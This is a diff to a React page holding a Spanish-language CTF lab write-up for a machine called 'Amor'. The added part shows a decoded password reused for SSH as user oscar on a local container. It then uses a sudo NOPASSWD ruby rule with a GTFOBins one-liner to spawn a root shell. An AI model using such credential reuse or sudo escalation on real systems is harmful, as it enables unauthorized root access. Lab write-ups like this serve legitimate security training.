@@ -57,8 +57,8 @@ function Amor() {
         </BreadcrumbList>
       </Breadcrumb>
       <div className="flex items-center flex-col">
-        <h1 className="text-5xl mb-5 font-bold">Amor</h1>
-        <div className="px-48 w-full">
+        <h1 className="text-5xl mt-3 mb-5 font-bold">Amor</h1>
+        <div className="md:px-48 w-full">
           <h2 className="my-2 text-3xl font-bold">
             Comenzamos inicializando la maquina
           </h2>
@@ -166,7 +166,51 @@ wrote extracted data to "secret.txt".'
             <a href="https://www.base64decode.org/es/">
               https://www.base64decode.org/es/
             </a>
+            Siendo el resultado el siguiente
           </p>
+          <CodeBash text="eslacasadepinypon" />
+          <p>
+            Usamos esa contraseña para intentar conectarnos a el otro usuario
+            oscar
+          </p>
+          <CodeBash
+            text="ssh oscar@172.17.0.2
+oscar@172.17.0.2's password: eslacasadepinypon
+Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.11.1-arch1-1 x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro"
+          />
+          <h2 className="mt-5  mb-2 text-3xl font-bold">
+            Escalado de privilegios
+          </h2>
+          <p>
+            Comenzamos revisando los comandos que podemos usar para el escalado
+          </p>
+          <CodeBash
+            text="sudo -l
+Matching Defaults entries for oscar on ee06f232d835:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User oscar may run the following commands on ee06f232d835:
+    (ALL) NOPASSWD: /usr/bin/ruby"
+          />
+          <p>
+            Vemos que podemos usar ruby como root, entonces revisamos su
+            referencia en{" "}
+            <a href="https://gtfobins.github.io/gtfobins/ruby/">GTFOBINS</a>
+          </p>
+          <p>Luego de leer esto usamos el siguiente comando</p>
+          <CodeBash
+            text={`$ sudo /usr/bin/ruby -e 'exec "/bin/sh"'
+# whoami
+root
+#`}
+          />
+          <p>Y eso es todo!!!! Conseguimos acceso root en la maquina</p>
         </div>
       </div>
     </div>
